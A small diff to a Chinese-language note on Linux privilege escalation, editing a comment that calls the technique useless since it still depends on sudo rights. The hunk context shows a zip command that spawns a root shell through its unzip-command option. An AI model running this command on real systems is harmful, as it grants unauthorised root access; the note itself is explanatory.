@@ -49,7 +49,7 @@ sudo zip r.zip fu.txt -T --unzip-command="bash -c /bin/bash"
 
 ### END ###
 
-复现完这个，觉得好鸡肋。。。
+这个好鸡肋。。。
 
 这其实还是"使用" `sudo` 方式进行提权的，现在基本没有管理员会把普通用户加入到`sudoers`文件中了吧。
 
